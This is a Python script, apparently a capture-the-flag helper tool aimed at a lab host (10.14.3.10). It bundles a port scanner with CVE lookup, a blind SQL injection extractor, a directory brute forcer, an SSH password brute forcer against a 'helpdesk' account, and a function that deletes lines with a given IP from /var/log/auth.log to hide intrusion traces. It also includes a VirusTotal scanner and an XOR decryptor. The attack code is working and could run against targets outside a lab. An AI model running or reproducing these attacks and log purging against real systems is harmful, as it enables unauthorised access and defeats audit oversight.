

import socket,ipaddress,requests,json,re,sys,paramiko,time,base64,os,subprocess,platform



banner = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :                  
                              
   _____ _______ ______   _    _ ______ _      _____  ______ _____  
  / ____|__   __|  ____| | |  | |  ____| |    |  __ \|  ____|  __ \ 
 | |       | |  | |__    | |__| | |__  | |    | |__) | |__  | |__) |
 | |       | |  |  __|   |  __  |  __| | |    |  ___/|  __| |  _  / 
 | |____   | |  | |      | |  | | |____| |____| |    | |____| | \ \ 
  \_____|  |_|  |_|      |_|  |_|______|______|_|    |______|_|  \_\
                                                                    
'''
flagregex = "CNS{\w{32}}" 
host = ""
initial = ['PORT SCAN & CVE SEARCH',
           'BLIND SQL INJECTION',
           'DIRECTORY BRUTE FORCE',
           'REGEX FOR FLAG ON HOMEPAGE',
           'SSH BRUTE FORCE',
           'OS DEFENSIVE',
           'LOG PARSER/DELETER',
           'MALWARE SCAN VIA VIRUS TOTAL',
           'XOR DECRYPTOR',
           'EXIT']

directory = 'files'
filelist = os.listdir(directory)
mykey = ##ENTER VIRUS TOTAL API KEY HERE##
options = ['0','1','2','3','4','5','6','7','8','9']
cmd = ''

print(banner)



def osDef():

    print("OS:" + platform.system())
    print("RELEASE:" + platform.release())
    print("VERSION:" + platform.version())
    print("MACHINE:" + platform.machine())
    print("PROCESSOR:" + platform.processor())

    keycheck = os.path.isdir('~/.ssh')

    if (keycheck):
        print(".ssh directory found in ~/,ssh")
    else:
        print("No .ssh directory found")



    print("CURRENT DIRECTORY setUID")
    #perm = os.popen('ls -l /').read()
    print(subprocess.check_output(["ls", "-l"]).decode('utf-8'))

    print("Cron jobs for current user:")
    cron = os.popen('crontab -l').read().strip()
    print(cron)

    print("Sockets:")
    sockets = os.popen('ss -l').read()
    print(sockets)


    print("Current Proccesses:")
    proccesses = os.popen('ps -A').read()
    print (proccesses)


def blindSQL(address):
    
    hidden = ''
    exists = "That 'value' exists."
    index = 1
    i = 48

    print("Performing enumeration. This may take a bit.")
    while (i <128 and (len(hidden)<38)):
        compare = chr(i)
        flag = "1' OR substring(value,1,{}) = '{}';#".format(index,hidden+compare)
        response = requests.post("http://10.14.3.10/flag.php",data = {'flag':flag})
        result = response.content.decode('utf-8')

        if(result==exists):
            hidden += chr(i)
            index += 1
            i = 48 

        else:
            i += 1

    print("FLAG FOUND:" + hidden +" \n")

def logDeleter(ip):
    
    myip = ip
    log = open('/var/log/auth.log','r')
    mylog = log.read().splitlines()
    log.close()

    newlog = open('/var/log/auth.log','w')

    for i in range(len(mylog)):
        if (myip not in mylog[i]):    
            newlog.write(mylog[i])
            newlog.write('\n')
        
    newlog.close()
    print(ip + " successfully purged")

    
def scanFile(file):
    #UPLOADS FILE TO VIRUSTOTAL
    url = 'https://www.virustotal.com/vtapi/v2/file/scan'
    params = {'apikey': mykey}
    files = {'file': (file, open(file, 'rb'))}
    response = requests.post(url, files=files, params=params)
    resource = response.json()['resource']

    while(True):
        #CHECKS REPORT
        url = 'https://www.virustotal.com/vtapi/v2/file/report'
        params = {'apikey': mykey, 'resource': resource}

        try:
            response = requests.get(url, params=params).json()
            #print (response)
            total = response['total']

            if(int(response['response_code']) != 1):

                print("RESPONSE CODE NOT READY")     
                time.sleep(20)

            else:
                print("SUCCESS")
                break
        except:
            print("FILE WAITING IN QUEUE")
            time.sleep(20)  


    return response


def xorDecrypt():

    decoded = base64.b64decode("xL/UirHHs5Pkl+SQsZfhkrSXsZOyw7OV5pXkxbSS5cW+k7fJ+g==")
    pt= "CNS{"
    test=''

    for i in range(len(pt)):
        test += chr(ord(pt[i]) ^ decoded[i])

    key = test[0:2]
    ans = ''

    for i in range(len(decoded)):
        ans += chr(decoded[i] ^ ord(key[i%len(key)]))

    print (ans)
    
def sshBruteForce(target):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    user = 'helpdesk'
    passfile = open('passwords.txt','r')
    content = passfile.readlines()

    for i in content:
        san = i.strip('\n')
        try:
            client.connect(hostname = target,look_for_keys=False,
                           username = user,allow_agent=False,
                           password = san,
                           timeout = 10, banner_timeout=200);
            print("FOUND USER:{} PASSWORD:{}".format(user,san))
            break;
        
        except paramiko.AuthenticationException:
            code = 1

        except socket.error as e:
            print(e)
            code =2

        client.close()

    

def homepage(server):
    response = requests.get(server + "/index.php")
    content = response.content.decode('utf-8')
    results = re.findall(flagregex,content)
    print(results)
    


def dirtest(server):
    file = open("directories.txt",'r')
    contents = file.readlines()
    for i in contents:
        san = i.strip('\n')
        response = requests.get(server+"/"+san)

        if (response.status_code != 404):
            print("/" + i + " CODE:" + str(response.status_code))


            flagresp = requests.get(server+"/"+san+"/flag.txt")


            if(flagresp.status_code != 404):
                print(flagresp.content.decode('utf-8'))

    print('\n')
    

def cveAPI(bannertoparse):

    services = ['OpenSSH', 'nginx', 'vsFTPd']
    regex = "\d+\.\d+\.?\d?\d?"

    search = re.findall(regex,bannertoparse)
    versionnum = search[len(search) - 1]

    print("VERSION {}".format(versionnum))
    print("The following CVEs are available for this service version")
    
    for i in services:
        if (i.lower() in bannertoparse.lower()):

            response = requests.get("https://cve.circl.lu/api/search/" + i.lower())
            y = response.json()
            cves = y['data']

            for x in cves:
                for j in x['vulnerable_product']:
                    if (versionnum in j):
                        print(x['id'])

    
def printOptions():
    for i in range(len(initial)):
        print("[{}] ".format(i) + initial[i])
    print ('\n')


def portScan(hosttoscan):    
    host = hosttoscan

    for i in range(0,1024):

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((host,i))
            s.send(bytes('test\r\n'.encode('utf-8')))
            banner = s.recv(100)
            s.close()         
            print("\nSuccess!! TCP PORT {} is open on {}!".format(i,host))
            print(banner.decode('utf-8') +'\n')
            print("Seaching for CVEs...")
            cveAPI(banner.decode('utf-8'))

        except:
            pass 

    print("TCP SCAN OF {} COMPLETE\n".format(str(host)))


while(True):
    printOptions()

    cmd = input("SELECT AN OPTION:")

    if(cmd in options):

        if (cmd == "0"): # Network (various CVEs)

            print("PROGRAM WILL BEGIN TO SCAN HOST FOR PORTS, VERSION NUMBERS AND CVEs")
            host = input("ENTER A HOST TO SCAN:")
            portScan(host)

        if (cmd == "2"): #/backup/flag.txt 

            print("Directory transversal via file")
            dirtest("http://10.14.3.10")

        if (cmd =="5"): #OS Defense 
            print("OS DEFENSE(Linux Systems Only)")
            try:
                osDef()
            except:
                print("Error. Command failed\n")
        if(cmd == "3"):
            print("FLAG FINDER")# 
            homepage("http://10.14.3.10")

        if(cmd == "4"):
            print("SSH BRUTE FORCE(May take some time. Be patient!") 
            sshBruteForce("10.14.3.10")
            print("\n")

        if (cmd == "8"):
            print("XOR DECRYPTOR(cipher text is hardcoded based on pattern)") 
            xorDecrypt()
            print("\n")

        if (cmd == "6"): # /var/log/auth.log

            print("Log Deleter: Deletes all auth.log entries containing given IP")
            myip = input("What IP would you like to purge?:")
            logDeleter(myip)


        if (cmd == "1"): #Peforms enumeration from blind SQL testing server. 
            print("BLIND SQL TEST")
            address = input("Please enter the web address of the target flag (flag.php):")
            blindSQL(address)

        if (cmd == "9"):
            break
            
        if(cmd == "7"): # 
            print("ANTI-VIRUS")
            for i in filelist:
                while (True):
                    try:
                        filereport = scanFile(directory + "/" + i)
                        total = int(filereport['total'])
                        positives = int(filereport['positives'])
                        break

                    except:
                        print("Upload ERROR. Trying again in 1 minute")
                        time.sleep(60)


                print("{} OUT OF {} SCANNERS HAVE FLAGGED FILE {}".format(positives,total,i))

                if (positives > 2):
                    danger = True
                    print("FILE HAS FINGERPRINT OF VIRUS.")

                else:
                    print("FILE IS MOST LIKELY NON MALICIOUS. NO ACTION TAKEN")
                    
                print("PROGRAM SLEEPING FOR 5 SECONDS TO AVOID API LOCKOUT")
                sec = 5
                while (sec > 0):
                    time.sleep(1)
                    print('.')
                    sec -= 1

    else:
        print("INVALID COMMAND\n")    

